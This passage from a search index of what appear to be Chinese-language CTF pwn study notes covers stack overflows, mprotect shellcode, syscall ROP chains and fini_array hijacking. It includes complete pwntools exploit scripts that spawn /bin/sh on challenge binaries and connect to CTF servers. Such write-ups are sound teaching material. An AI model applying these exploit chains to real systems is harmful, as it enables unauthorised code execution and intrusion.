p.interactive()","title":"\u4ec5\u6808\u6ea2\u51fa"},{"location":"linker/statically_linked/#mprotect","text":"\u8fd9\u91cc\u83b7\u53d6\u9759\u6001\u7a0b\u5e8f\u7684\u51fd\u6570\u5730\u5740\u548c\u52a8\u6001\u94fe\u63a5\u7684\u6709\u533a\u522b\uff1a elf = ELF(\"./get_started_3dsctf_2016\") # \u82e5\u662f\u52a8\u6001\u94fe\u63a5 puts_plt = elf.plt['read'] # \u82e5\u662f\u9759\u6001\u94fe\u63a5 puts_plt = elf.sym['read'] # \u65b9\u6cd5\u4e00 puts_plt = elf.symbols['read'] # \u65b9\u6cd5\u4e8c from pwn import * context.log_level = 'debug' p = process(\"./get_started_3dsctf_2016\") #p = remote(\"node3.buuoj.cn\",28471) elf = ELF(\"./get_started_3dsctf_2016\") pop3_ret = 0x804951D shellcode = asm(shellcraft.sh(),arch = 'i386', os = 'linux') mprotect_addr = elf.symbols['mprotect'] read_addr = elf.symbols['read'] got_plt = 0x80EB000 payload = 'a'*0x38 payload += p32(mprotect_addr) + p32(pop3_ret) + p32(got_plt) + p32(0x200) + p32(0x7) payload += p32(read_addr) + p32(got_plt) + p32(0) + p32(got_plt) + p32(0x200) #payload += p32(got_plt) gdb.attach(p) p.sendline(payload) p.sendline(shellcode) p.interactive()","title":"\u6808\u6ea2\u51fa+mprotect"},{"location":"linker/statically_linked/#2017-pwn300","text":"32 \u4f4d\u9759\u6001\u94fe\u63a5\u9898\u76ee\uff0c\u9700\u8981\u7ed3\u5408\u7528\u6237\u8f93\u5165\u7684\u5185\u5bb9\uff0c\u7136\u540e\u8c03\u7528 ELF \u81ea\u8eab\u7684 gadget \u6784\u5efa\u7cfb\u7edf\u8c03\u7528\u3002","title":"\u5b9e\u9a8c\u4e8c\uff1a2017 \u6e56\u6e58\u676f pwn300"},{"location":"linker/statically_linked/#cmcc_simplerop","text":"\u8003\u70b9\uff1a\u9759\u6001\u94fe\u63a5\u3001\u7cfb\u7edf\u8c03\u7528\u53f7\u3001\u6808\u6ea2\u51fa","title":"\u5b9e\u9a8c\u4e09\uff1acmcc_simplerop"},{"location":"linker/statically_linked/#_8","text":"","title":"\u5206\u6790"},{"location":"linker/statically_linked/#_9","text":"32 \u4f4d\u7a0b\u5e8f\uff0cNX \u4fdd\u62a4 Arch: i386-32-little RELRO: Partial RELRO Stack: No canary found NX: NX enabled PIE: No PIE (0x8048000)","title":"\u4fdd\u62a4\u60c5\u51b5"},{"location":"linker/statically_linked/#_10","text":"main \u4e2d\u6ea2\u51fa\uff0c\u6ea2\u51fa\u957f\u5ea6\u633a\u5927\u7684\uff1a int __cdecl main(int argc, const char **argv, const char **envp) { int v4; // [esp+1Ch] [ebp-14h] puts(\"ROP is easy is'nt it ?\"); printf(\"Your input :\"); fflush(stdout); return read(0, &v4, 0x64); }","title":"\u6f0f\u6d1e\u51fd\u6570"},{"location":"linker/statically_linked/#_11","text":"\u4e4b\u524d\u9047\u5230 get_started_3dsctf_2016 \u7684\u65f6\u5019\u60c5\u51b5\u4e0e\u8fd9\u6761\u9898\u76ee\u770b\u4e0a\u53bb\u7c7b\u4f3c\uff0c\u7528\u7684\u662f mprotect \u7ed9\u5185\u5b58\u6dfb\u52a0\u6267\u884c\u6743\u9650\uff0c\u7136\u540e\u5199\u5165 shellcode \u3002\u5b9e\u9645\u64cd\u4f5c\u4e00\u4e0b\u8fd9\u6761\u9898\u76ee\uff0cbss \u3001 got.plt \u4e24\u4e2a\u6bb5\u4fee\u6539\u4e0d\u6210\u529f\uff0c\u6700\u540e\u770b\u5927\u4f6c wp \u77e5\u9053\u7528 \u7cfb\u7edf\u8c03\u7528\u53f7 \u3002\u4e4b\u524d\u4e5f\u505a\u8fc7\u4e00\u6761\u9898\u76ee\u4e5f\u662f\u7528\u7cfb\u7edf\u8c03\u7528\u53f7\uff0c\u53ef\u4ee5\u5957\u7528\u90a3\u4e2a\u601d\u8def\u3002 \u4ec0\u4e48\u662f\u7cfb\u7edf\u8c03\u7528\uff1f \u7ef4\u57fa\u767e\u79d1 \u7cfb\u7edf\u8c03\u7528\u53f7\u6709\u54ea\u4e9b\uff1f Linux\u7cfb\u7edf\u8c03\u7528 int 80h int 0x80 \u5c31\u662f\u6211\u4eec\u6700\u540e\u6267\u884c\u8fd9\u6761\u547d\u4ee4\uff1a int80(11,\"/bin/sh\",null,null) \u3002\u7cfb\u7edf\u8c03\u7528\u53c2\u6570\u662f\u8bfb\u53d6\u5bc4\u5b58\u5668\u4e2d\u7684\uff08\u5bf9\u8fd9\u4e0d\u662f32\u4f4d\u7cfb\u7edf\u7684\u6808\u4f20\u53c2\uff09\u3002 \u56db\u4e2a\u53c2\u6570\u5bf9\u5e94\u5bc4\u5b58\u5668\u662f\uff1aeax\u3001ebx\u3001ecx\u3001edx payload = p32(pop_eax) + p32(0xb) #\u7cfb\u7edf\u8c03\u7528\u53f7 payload += p32(pop_edx_ecx_ebx) + p32(0) + p32(0) + p32(binsh_addr) payload += p32(int_80) \u7a0b\u5e8f\u4e2d\u6ca1\u6709\u627e\u5230 /bin/sh\\x00 \u5b57\u7b26\u4e32\uff0c\u6240\u4ee5\u8fd8\u9700\u8981\u6784\u5efa\u8c03\u7528 read \u51fd\u6570\u5199\u5165\u5b57\u7b26\u4e32 payload = 'a'*0x20 + p32(read_addr) + p32(pop_edx_ecx_ebx) + p32(0) + p32(binsh_addr) + p32(0x8)","title":"\u601d\u8def"},{"location":"linker/statically_linked/#exp_1","text":"#encoding:utf-8 from pwn import * context.log_level = 'debug' p = remote('node3.buuoj.cn',29604) #p = process(\"./simplerop\") int_80 = 0x80493e1 pop_eax = 0x80bae06 read_addr = 0x0806CD50 binsh_addr = 0x080EB584 pop_edx_ecx_ebx = 0x0806e850 payload = 'a'*0x20 + p32(read_addr) + p32(pop_edx_ecx_ebx) + p32(0) + p32(binsh_addr) + p32(0x8) payload += p32(pop_eax) + p32(0xb) #\u7cfb\u7edf\u8c03\u7528\u53f7 payload += p32(pop_edx_ecx_ebx) + p32(0) + p32(0) + p32(binsh_addr) payload += p32(int_80) #gdb.attach(p) p.sendline(payload) p.sendline('/bin/sh\\x00') p.interactive()","title":"exp"},{"location":"stackoverflow/hijack_fini_array_ROP/","text":"\u52ab\u6301 64 \u4f4d fini_array \u8fdb\u884c ROP \u653b\u51fb \u7a0b\u5e8f\u8d77\u70b9 \u7a0b\u5e8f\u7684\u542f\u52a8\u6d41\u7a0b\u5982\u56fe\u6240\u793a\uff1a \u53ef\u4ee5\u770b\u5230 main \u51fd\u6570\u4e0d\u662f\u7a0b\u5e8f\u8d77\u70b9\uff0c\u4e4b\u524d\u5199\u7684 \u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u76f2\u6253 \u4e5f\u5206\u6790\u8fc7 text \u6bb5\u8d77\u70b9\u662f _start \u51fd\u6570 \u3002_start \u51fd\u6570\u8c03\u7528__libc_start_main \u5b8c\u6210\u542f\u52a8\u548c\u9000\u51fa\u5de5\u4f5c\u3002\u5177\u4f53\u770b\u770b _start \u51fd\u6570\uff1a .text:0000000000401A60 public start .text:0000000000401A60 start proc near ; DATA XREF: LOAD:0000000000400018\u2191o .text:0000000000401A60 ; __unwind { .text:0000000000401A60 xor ebp, ebp .text:0000000000401A62 mov r9, rdx .text:0000000000401A65 pop rsi .text:0000000000401A66 mov rdx, rsp .text:0000000000401A69 and rsp, 0FFFFFFFFFFFFFFF0h .text:0000000000401A6D push rax .text:0000000000401A6E push rsp // \u4ee5\u6b64\u5c06 fini\u3001init\u3001main \u5730\u5740\u538b\u5165\u5bc4\u5b58\u5668 .text:0000000000401A6F mov r8, offset sub_402BD0 ; fini .text:0000000000401A76 mov rcx, offset loc_402B40 ; init .text:0000000000401A7D mov rdi, offset main .text:0000000000401A84 db 67h .text:0000000000401A84 call __libc_start_main .text:0000000000401A8A hlt .text:0000000000401A8A ; } // starts at 401A60 .text:0000000000401A8A start endp __libc_start_main \u5b9a\u4e49\u539f\u578b \uff1a int __libc_start_main(int (*main) (int, char **, char **), int argc, char ** ubp_av, void (*init) (void), void (*fini) (void), void (*rtld_fini) (void), void (*stack_end)); \u6839\u636e 64 \u4f4d\u4f20\u53c2\u7279\u5b9a\u5f97\u51fa\u5bf9\u5e94\u5bc4\u5b58\u5668\u503c\u3002\u8fd9\u4e2a\u6267\u884c\u987a\u5e8f\u6211\u662f\u901a\u8fc7\u8c03\u8bd5\u5f97\u51fa\u6765\u7684\u3002\uff08__libc_csu_init \u7684\u8bdd\u662f ret2csu \u5229\u7528\u5bf9\u8c61\u3002\uff09 rdi <- main rcx <- __libc_csu_init //\u5728main\u51fd\u6570\u524d\u6267\u884c r8 <- __libc_csu_fini //\u5728main\u51fd\u6570\u540e\u6267\u884c __libc_csu_fini \u51fd\u6570 __libc_csu_fini \u51fd\u6570\u662f main \u51fd\u6570\u9000\u51fa\u8fd4\u56de\u5230 __libc_start_main \u540e\uff0c\u901a\u8fc7 __libc_start_main \u8c03\u7528\u7684\u3002\u5177\u4f53\u770b\u770b\u51fd\u6570\uff1a .text:0000000000402960 __libc_csu_fini proc near ; DATA XREF: start+F\u2191o .text:0000000000402960 ; __unwind { .text:0000000000402960 push rbp .text:0000000000402961 lea rax, unk_4B4100 .text:0000000000402968 lea rbp, _fini_array_0 .text:000000000040296F push rbx .text:0000000000402970 sub rax, rbp .text:0000000000402973 sub rsp, 8 .text:0000000000402977 sar rax, 3 .text:000000000040297B jz short loc_402996 .text:000000000040297D lea rbx, [rax-1] .text:0000000000402981 nop dword ptr [rax+00000000h] .text:0000000000402988 .text:0000000000402988 loc_402988: ; CODE XREF: __libc_csu_fini+34\u2193j .text:0000000000402988 call qword ptr [rbp+rbx*8+0] .text:000000000040298C sub rbx, 1 .text:0000000000402990 cmp rbx, 0FFFFFFFFFFFFFFFFh .text:0000000000402994 jnz short loc_402988 .text:0000000000402996 .text:0000000000402996 loc_402996: ; CODE XREF: __libc_csu_fini+1B\u2191j .text:0000000000402996 add rsp, 8 .text:000000000040299A pop rbx .text:000000000040299B pop rbp .text:000000000040299C jmp sub_48E32C .text:000000000040299C ; } // starts at 402960 .text:000000000040299C __libc_csu_fini endp \u6ce8\u610f\u4ee5\u4e0b\u8fd9\u4e09\u884c\u6e90\u7801\uff0c\u662f\u52ab\u6301 fini_array \u5b9e\u73b0\u65e0\u9650\u5199\u8fdb\u884c ROP \u7684\u5173\u952e\uff1a //\u5c06 fini_array[0] \u7684\u503c\u52a0\u8f7d\u5230 rbp .text:0000000000402968 lea rbp, _fini_array_0 //\u7ecf\u8fc7\u4e00\u7cfb\u5217\u8fd0\u7b97\u540e\uff0c\u8fd9\u91cc\u4f1a call fini_array[1] \uff0c\u4e5f\u5c31\u662f\u8c03\u7528\u5b58\u50a8\u5728 fini_array[1] \u7684\u6307\u9488 .text:0000000000402988 call qword ptr [rbp+rbx*8+0] //\u8c03\u7528\u5b8c fini_array[1] \u4e4b\u540e\u518d\u6b21\u8fdb\u8fc7\u4e00\u7cfb\u5217\u8fd0\u7b97\uff0c\u8fd9\u91cc\u4f1a call fini_array[0] .text:0000000000402988 call qword ptr [rbp+rbx*8+0] \u770b\u4e00\u4e0b fini_array \u7684\u4ee3\u7801\uff1a .fini_array:00000000004B40F0 _fini_array segment para public 'DATA' use64 .fini_array:00000000004B40F0 assume cs:_fini_array .fini_array:00000000004B40F0 ;org 4B40F0h .fini_array:00000000004B40F0 _fini_array_0 dq offset sub_401B00 ; DATA XREF: .text:000000000040291C\u2191o .fini_array:00000000004B40F0 ; __libc_csu_fini+8\u2191o .fini_array:00000000004B40F8 dq offset sub_401580 .fini_array:00000000004B40F8 _fini_array ends \u8fd9\u91cc\u660e\u786e\u77e5\u9053\u4e86 fini_array \u91cc\u9762\u5b58\u50a8\u4e86\u4e24\u4e2a\u6307\u9488\uff0c\u8c03\u7528\u987a\u5e8f\u4e3a\uff1a\u5148 fini_array[1] \uff0c\u518d fini_array[0] \u3002\u90a3\u4e48 \u5982\u679c\u6211\u4eec\u628a fini_array[1] \u8986\u76d6\u4e3a\u51fd\u6570 A \u7684\u5730\u5740\uff0cfini_array[0] \u8986\u76d6\u4e3a __libc_csu_fini \u7684\u5730\u5740 \uff0c\u5f53\u9000\u51fa main \u540e\uff0c\u7a0b\u5e8f\u4f1a\u8fd9\u6837\uff1a __libc_csu_fini\u5148\u6267\u884c\u4e00\u904dfini_array[1]:addrA\uff0c\u8fd4\u56de\u540e\u518d\u6267\u884cfini_array[0]:__libc_csu_fini __libc_csu_fini\u5148\u6267\u884c\u4e00\u904dfini_array[1]:addrA\uff0c\u8fd4\u56de\u540e\u518d\u6267\u884cfini_array[0]:__libc_csu_fini __libc_csu_fini\u5148\u6267\u884c\u4e00\u904dfini_array[1]:addrA\uff0c\u8fd4\u56de\u540e\u518d\u6267\u884cfini_array[0]:__libc_csu_fini ...... \u8fd9\u4e2a\u5faa\u73af\u5c31\u4f1a\u4e00\u76f4\u6301\u7eed\u5230 fini_array[0] \u88ab\u8986\u76d6\u4e3a\u5176\u4ed6\u503c\u3002 \u8fd8\u6709\u4e2a\u70b9\u5c31\u662f\u4e0a\u9762\u63d0\u5230\u7684\u6e90\u7801\u4e2d\u7684 lea rbp, _fini_array_0 \uff0c\u5c06 rbp \u7684\u503c\u4fee\u6539\u4e3a fini_array[0] \u6240\u5728\u7684\u5730\u5740\uff0c\u90a3\u4e48\u914d\u5408 leave|ret \u5c31\u80fd\u5c06\u6808\u8fc1\u79fb\u5230 fini_array + 0x10 \u7684\u5730\u5740\uff0c\u6211\u4eec\u5c31\u5c06\u5229\u7528\u51fd\u6570\u653e\u5728\u8fd9\u4e2a\u5730\u65b9\u3002 pwnable.tw-3x17 \u4fdd\u62a4\u60c5\u51b5 \u9759\u6001\u94fe\u63a5\u7684 64 \u4f4d\u7a0b\u5e8f\uff1a skye:~/CTF\u5b66\u4e60/fini_array\u52ab\u6301$ file 317 317: ELF 64-bit LSB executable, x86-64, version 1 (GNU/Linux), statically linked, for GNU/Linux 3.2.0, BuildID[sha1]=a9f43736cc372b3d1682efa57f19a4d5c70e41d3, stripped checksec \u68c0\u67e5\u662f\u6ca1\u6709 canary \u4f46\u662f\u6839\u636e\u6c47\u7f16\u53bb\u68c0\u67e5 \u662f\u6709 canary \u4fdd\u62a4 \u7684\uff1a Arch: amd64-64-little RELRO: Partial RELRO Stack: No canary found NX: NX enabled PIE: No PIE (0x400000) \u6f0f\u6d1e\u51fd\u6570 \u9898\u76ee\u7f16\u8bd1\u7684\u4e8c\u8fdb\u5236\u6587\u4ef6\u6ca1\u6709\u7b26\u53f7\u8868\uff0c\u53ef\u4ee5\u5c1d\u8bd5\u7528 lscan \u627e\u5230\u5bf9\u5e94 sig \u6587\u4ef6\u4fee\u590d\uff0c\u6216\u8005\u901a\u8fc7\u5b57\u7b26\u4e32\u5b9a\u4f4d\u5230 main \u51fd\u6570\u4f4d\u7f6e\uff08shift+F12\uff09\u3002 main \u51fd\u6570\u4e2d\u4e00\u4e2a\u4efb\u610f\u5730\u5740\u5199\u5165 0x18 \u7684\u529f\u80fd\uff1a //\u91cd\u547d\u540d\u90e8\u5206\u51fd\u6570\u540d int __cdecl main(int argc, const char **argv, const char **envp) { int result; // eax char *v4; // ST08_8 char buf; // [rsp+10h] [rbp-20h] unsigned __int64 v6; // [rsp+28h] [rbp-8h] v6 = __readfsqword(0x28u); result = (unsigned __int8)++byte_4B9330; if ( byte_4B9330 == 1 ) { write_fun(1u, \"addr:\", 5uLL); read_fun(0, &buf, 0x18uLL);//\u8bfb\u53d6\u5730\u5740 v4 = (char *)(signed int)sub_40EE70((__int64)&buf); write_fun(1u, \"data:\", 5uLL); read_fun(0, v4, 0x18uLL);//\u5411\u8bfb\u53d6\u5730\u5740\u5199\u5165\u5185\u5bb9 result = 0; } if ( __readfsqword(0x28u) != v6 ) sub_44A3E0(); return result; } \u601d\u8def \u8fd9\u6761\u9898\u76ee\u8fd8\u6709\u5176\u4ed6\u89e3\u6cd5\uff0c\u56e0\u4e3a\u7528\u8fd9\u6761\u9898\u76ee\u5b66\u4e60 fini_array \u52ab\u6301 \u5c31\u8bb0\u5f55\u8fd9\u79cd\u505a\u6cd5\u3002\u5176\u4ed6\u89e3\u6cd5\uff1a pwnable.tw_3x17 \u9759\u6001\u7f16\u8bd1\u7a0b\u5e8f\u53ea\u80fd\u7528\u5b83\u7684\u6709\u4e1c\u897f getshell \u3002\u5199 shellcode \u4f30\u8ba1\u8981 mprotect \u7ed9\u5185\u5bb9\u52a0\u4e0a\u8fd0\u884c\u6743\u9650\u7ed5\u8fc7 NX \u4fdd\u62a4\uff1b\u5199\u4e2a\u7cfb\u7edf\u8c03\u7528\u53f7\u53ef\u884c\u4e00\u70b9\u3002 \u90a3\u5c31\u9700\u8981\u7528\u5230\u5199\u5165\u529f\u80fd\u51fd\u6570\u4e86\uff0c\u5982\u679c\u9700\u8981\u7b26\u5408\u672c\u6587\u5b66\u4e60\u5185\u5bb9\uff0c\u5c31\u9700\u8981\u4e00\u4e2a\u4efb\u610f\u5730\u5740\u5199\u7684\u51fd\u6570\uff0c\u521a\u597d main \u51fd\u6570\u5c31\u662f\u3002\u73b0\u5728\u660e\u786e\u601d\u8def\uff1a \u5c06 fini_array[1] \u8986\u76d6\u4e3a main \u51fd\u6570\u5730\u5740\uff1bfini_array[0] \u8986\u76d6\u4e3a __libc_start_fini \u5730\u5740\uff1b \u4f9d\u6b21\u5411 fini_array + 0x10 \u5199\u5165\u7cfb\u7edf\u8c03\u7528\u53f7\u5229\u7528\u4ee3\u7801\uff1b \u5199\u5165\u5b8c\u6210\u540e\uff0c\u5c06 fini_array[0] \u8986\u76d6\u4e3a leave|ret \uff0c\u5c06\u6808\u8fc1\u79fb\u5230 fini_array + 0x10; \u6784\u5efa\u7684\u7cfb\u7edf\u8c03\u7528\u547d\u4ee4\uff1asyscall(0x3b,addr_of_binsh,0,0) \u76f8\u5f53\u4e8e\uff1aexecve(addr_of_binsh,0,0) \u7cfb\u7edf\u8c03\u7528\u53f7\u67e5\u8be2\uff1ahttps://www.mrskye.cn/archives/168/ exp from pwn import * context.log_level = 'debug' #p = process(\"./317\") p = remote(\"chall.pwnable.tw\",10105) elf = process(\"./317\") fini_array = 0x4B40F0 main_addr = 0x401B6D libc_csu_fini = 0x402960 esp = fini_array + 0x10 leave_ret = 0x401C4B ret = 0x401016 rop_syscall = 0x471db5 rop_pop_rax = 0x41e4af rop_pop_rdx = 0x446e35 rop_pop_rsi = 0x406c30 rop_pop_rdi = 0x401696 bin_sh_addr = 0x4B419A def write(addr,data): p.recv() p.send(str(addr)) p.recv() p.send(data) def exp(): # hijack fini_array #gdb.attach(p) write(fini_array,p64(libc_csu_fini) + p64(main_addr)) # rop chain write(bin_sh_addr,\"/bin/sh\\x00\") write(esp,p64(rop_pop_rax)) write(esp+8,p64(0x3b)) write(esp+16,p64(rop_pop_rdi)) write(esp+24,p64(bin_sh_addr)) write(esp+32,p64(rop_pop_rdx)) write(esp+40,p64(0)) write(esp+48,p64(rop_pop_rsi)) write(esp+56,p64(0)) write(esp+64,p64(rop_syscall)) # stack pivoting write(fini_array,p64(leave_ret) + p64(ret)) if __name__ == '__main__': exp() p.interactive() \u53c2\u8003\u6587\u7ae0 [\u539f\u521b]pwnable.tw\u65b0\u624b\u5411write up(\u4e8c) 3\u00d717-x64\u9759\u6001\u7f16\u8bd1\u7a0b\u5e8f\u7684fini_array\u52ab\u6301 Memory Monster II \u9898\u76ee\u6765\u6e90 DASCTF \u4e94\u6708\u8d5b\uff0c\u4f5c\u8005\u4e3a TaQini \uff0c \u9644\u4ef6 \u8fd9\u91cc\u548c\u4e0a\u9762\u90a3\u6761\u673a\u4f1a\u4e00\u6837\uff0c\u4e0b\u9762\u662f\u72ec\u7acb\u5b8c\u6210\uff0c\u8be6\u7ec6\u8bb0\u5f55\u4e00\u4e0b \u4fdd\u62a4\u60c5\u51b5 checksec \u68c0\u67e5\u662f\u6ca1\u6709 canary \u4f46\u662f\u6839\u636e\u6c47\u7f16\u53bb\u68c0\u67e5 \u662f\u6709 canary \u4fdd\u62a4 \u7684\uff1a Arch: amd64-64-little RELRO: Partial RELRO Stack: No canary found NX: NX enabled PIE: No PIE (0x400000) \u6f0f\u6d1e\u51fd\u6570 \u9898\u76ee\u7f16\u8bd1\u7684\u4e8c\u8fdb\u5236\u6587\u4ef6\u6ca1\u6709\u7b26\u53f7\u8868\uff0c\u53ef\u4ee5\u5c1d\u8bd5\u7528 lscan \u627e\u5230\u5bf9\u5e94 sig \u6587\u4ef6\u4fee\u590d\uff0c\u6ca1\u6709\u5375\u7528\u53ea\u4fee\u590d\u4e86\u4e24\u4e2a\u51fd\u6570\uff0c\u4f46\u662f\u80fd\u770b\u5230 _start \u51fd\u6570\uff1a\uff08\u91cd\u547d\u540d\u90e8\u5206\u51fd\u6570\uff09 .text:0000000000401B00 public start .text:0000000000401B00 start proc near ; DATA XREF: LOAD:0000000000400018\u2191o .text:0000000000401B00 ; __unwind { .text:0000000000401B00 xor ebp, ebp .text:0000000000401B02 mov r9, rdx .text:0000000000401B05 pop rsi .text:0000000000401B06 mov rdx, rsp .text:0000000000401B09 and rsp, 0FFFFFFFFFFFFFFF0h .text:0000000000401B0D push rax .text:0000000000401B0E push rsp .text:0000000000401B0F mov r8, offset __libc_start_fini .text:0000000000401B16 mov rcx, offset __libc_start_init .text:0000000000401B1D mov rdi, offset main .text:0000000000401B24 db 67h .text:0000000000401B24 call sub_4020B0 .text:0000000000401B2A hlt .text:0000000000401B2A ; } // starts at 401B00 .text:0000000000401B2A start endp \u4f9d\u636e\u89c4\u5f8b\u77e5\u9053\u4e09\u4e2a mov \u4f9d\u6b21\u662f\u5904\u7406 __libc_start_fini\u3001__libc_start_init\u3001main \u3002\u4ece\u8fd9\u91cc\u83b7\u53d6\u5230\u5173\u952e\u53c2\u6570\uff1a __libc_start_fini\u3001main \u5730\u5740\u3002 \u7136\u540e gdb \u8c03\u8bd5\uff0c\u65ad\u70b9\u6253\u5728 __libc_start_fini \uff0c\u4e00\u76f4\u8fd0\u884c\u5230 call \u6307\u4ee4\uff0crbp \u5b58\u50a8\u7684\u503c\u5c31\u662f fini_array[0] \u7684\u5730\u5740 0x4b80b0 \uff1a leave_ret \u548c ret \u901a\u8fc7 ROPgadget \u76f4\u63a5\u80fd\u67e5\u5230\uff1brax\u3001rdi\u3001rsi\u3001rdx \u4f20\u53c2 gadget \u4e5f\u80fd\u627e\u5230\uff0c\u8fd9\u51e0\u4e2a gadget \u627e\u90a3\u79cd\u53ea\u7a7f\u4e00\u4e2a\u5bc4\u5b58\u5668\u7684\uff1a pop rax;ret \u3002 exp from pwn import * context.log_level = 'debug' p = process(\"./main\") elf = ELF(\"./main\") #hijack fini libc_csu_fini = 0x0402CB0 main_addr = 0x0401C1D fini_array = 0x4b80b0 esp = fini_array + 0x10 leave_ret = 0x0401cf3 ret = 0x0401016 #execve('/bin/sh',0,0) rop_syscall = 0x46F745 rop_pop_rax = 0x0000000000448fcc rop_pop_rdx = 0x0000000000448415 rop_pop_rsi = 0x0000000000406f80 rop_pop_rdi = 0x0000000000401746 bin_sh_addr = 0x492895 def write(addr,data): p.sendlineafter('addr:',p64(addr)) p.sendafter('data:',data) # hijack fini_array gdb.attach(p,'b *0x0402CB0') write(fini_array,p64(libc_csu_fini) + p64(main_addr)) # rop chain write(esp,p64(rop_pop_rax)) write(esp+8,p64(0x3b)) write(esp+16,p64(rop_pop_rdi)) write(esp+24,p64(bin_sh_addr)) write(esp+32,p64(rop_pop_rdx)) write(esp+40,p64(0)) write(esp+48,p64(rop_pop_rsi)) write(esp+56,p64(0)) write(esp+64,p64(rop_syscall)) # stack pivoting #gdb.attach(p) write(fini_array,p64(leave_ret) + p64(ret)) p.interactive() \u53c2\u8003\u6587\u7ae0 \u8be6\u89e364\u4f4d\u9759\u6001\u7f16\u8bd1\u7a0b\u5e8f\u7684fini_array\u52ab\u6301\u53caROP\u653b\u51fb","title":"\u52ab\u6301fini_array"},{"location":"stackoverflow/hijack_fini_array_ROP/#64-fini_array-rop","text":"","title":"\u52ab\u6301 64 \u4f4d fini_array \u8fdb\u884c ROP \u653b\u51fb"},{"location":"stackoverflow/hijack_fini_array_ROP/#_1","text":"\u7a0b\u5e8f\u7684\u542f\u52a8\u6d41\u7a0b\u5982\u56fe\u6240\u793a\uff1a \u53ef\u4ee5\u770b\u5230 main \u51fd\u6570\u4e0d\u662f\u7a0b\u5e8f\u8d77\u70b9\uff0c\u4e4b\u524d\u5199\u7684 \u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u76f2\u6253 \u4e5f\u5206\u6790\u8fc7 text \u6bb5\u8d77\u70b9\u662f _start \u51fd\u6570 \u3002_start \u51fd\u6570\u8c03\u7528__libc_start_main \u5b8c\u6210\u542f\u52a8\u548c\u9000\u51fa\u5de5\u4f5c\u3002\u5177\u4f53\u770b\u770b _start \u51fd\u6570\uff1a .text:0000000000401A60 public start .text:0000000000401A60 start proc near ; DATA XREF: LOAD:0000000000400018\u2191o .text:0000000000401A60 ; __unwind { .text:0000000000401A60 xor ebp, ebp .text:0000000000401A62 mov r9, rdx .text:0000000000401A65 pop rsi .text:0000000000401A66 mov rdx, rsp .text:0000000000401A69 and rsp, 0FFFFFFFFFFFFFFF0h .text:0000000000401A6D push rax .text:0000000000401A6E push rsp // \u4ee5\u6b64\u5c06 fini\u3001init\u3001main \u5730\u5740\u538b\u5165\u5bc4\u5b58\u5668 .text:0000000000401A6F mov r8, offset sub_402BD0 ; fini .text:0000000000401A76 mov rcx, offset loc_402B40 ; init .text:0000000000401A7D mov rdi, offset main .text:0000000000401A84 db 67h .text:0000000000401A84 call __libc_start_main .text:0000000000401A8A hlt .text:0000000000401A8A ; } // starts at 401A60 .text:0000000000401A8A start endp __libc_start_main \u5b9a\u4e49\u539f\u578b \uff1a int __libc_start_main(int (*main) (int, char **, char **), int argc, char ** ubp_av, void (*init) (void), void (*fini) (void), void (*rtld_fini) (void), void (*stack_end)); \u6839\u636e 64 \u4f4d\u4f20\u53c2\u7279\u5b9a\u5f97\u51fa\u5bf9\u5e94\u5bc4\u5b58\u5668\u503c\u3002\u8fd9\u4e2a\u6267\u884c\u987a\u5e8f\u6211\u662f\u901a\u8fc7\u8c03\u8bd5\u5f97\u51fa\u6765\u7684\u3002\uff08__libc_csu_init \u7684\u8bdd\u662f ret2csu \u5229\u7528\u5bf9\u8c61\u3002\uff09 rdi <- main rcx <- __libc_csu_init //\u5728main\u51fd\u6570\u524d\u6267\u884c r8 <- __libc_csu_fini //\u5728main\u51fd\u6570\u540e\u6267\u884c","title":"\u7a0b\u5e8f\u8d77\u70b9"},{"location":"stackoverflow/hijack_fini_array_ROP/#__libc_csu_fini","text":"__libc_csu_fini \u51fd\u6570\u662f main \u51fd\u6570\u9000\u51fa\u8fd4\u56de\u5230 __libc_start_main \u540e\uff0c\u901a\u8fc7 __libc_start_main \u8c03\u7528\u7684\u3002\u5177\u4f53\u770b\u770b\u51fd\u6570\uff1a .text:0000000000402960 __libc_csu_fini proc near ; DATA XREF: start+F\u2191o .text:0000000000402960 ; __unwind { .text:0000000000402960 push rbp .text:0000000000402961 lea rax, unk_4B4100 .text:0000000000402968 lea rbp, _fini_array_0 .text:000000000040296F push rbx .text:0000000000402970 sub rax, rbp .text:0000000000402973 sub rsp, 8 .text:0000000000402977 sar rax, 3 .text:000000000040297B jz short loc_402996 .text:000000000040297D lea rbx, [rax-1] .text:0000000000402981 nop dword ptr [rax+00000000h] .text:0000000000402988 .text:0000000000402988 loc_402988: ; CODE XREF: __libc_csu_fini+34\u2193j .text:0000000000402988 call qword ptr [rbp+rbx*8+0] .text:000000000040298C sub rbx, 1 .text:0000000000402990 cmp rbx, 0FFFFFFFFFFFFFFFFh .text:0000000000402994 jnz short loc_402988 .text:0000000000402996 .text:0000000000402996 loc_402996: ; CODE XREF: __libc_csu_fini+1B\u2191j .text:0000000000402996 add rsp, 8 .text:000000000040299A pop rbx .text:000000000040299B pop rbp .text:000000000040299C jmp sub_48E32C .text:000000000040299C ; } // starts at 402960 .text:000000000040299C __libc_csu_fini endp \u6ce8\u610f\u4ee5\u4e0b\u8fd9\u4e09\u884c\u6e90\u7801\uff0c\u662f\u52ab\u6301 fini_array \u5b9e\u73b0\u65e0\u9650\u5199\u8fdb\u884c ROP \u7684\u5173\u952e\uff1a //\u5c06 fini_array[0] \u7684\u503c\u52a0\u8f7d\u5230 rbp .text:0000000000402968 lea rbp, _fini_array_0 //\u7ecf\u8fc7\u4e00\u7cfb\u5217\u8fd0\u7b97\u540e\uff0c\u8fd9\u91cc\u4f1a call fini_array[1] \uff0c\u4e5f\u5c31\u662f\u8c03\u7528\u5b58\u50a8\u5728 fini_array[1] \u7684\u6307\u9488 .text:0000000000402988 call qword ptr [rbp+rbx*8+0] //\u8c03\u7528\u5b8c fini_array[1] \u4e4b\u540e\u518d\u6b21\u8fdb\u8fc7\u4e00\u7cfb\u5217\u8fd0\u7b97\uff0c\u8fd9\u91cc\u4f1a call fini_array[0] .text:0000000000402988 call qword ptr [rbp+rbx*8+0] \u770b\u4e00\u4e0b fini_array \u7684\u4ee3\u7801\uff1a .fini_array:00000000004B40F0 _fini_array segment para public 'DATA' use64 .fini_array:00000000004B40F0 assume cs:_fini_array .fini_array:00000000004B40F0 ;org 4B40F0h .fini_array:00000000004B40F0 _fini_array_0 dq offset sub_401B00 ; DATA XREF: .text:000000000040291C\u2191o .fini_array:00000000004B40F0 ; __libc_csu_fini+8\u2191o .fini_array:00000000004B40F8 dq offset sub_401580 .fini_array:00000000004B40F8 _fini_array ends 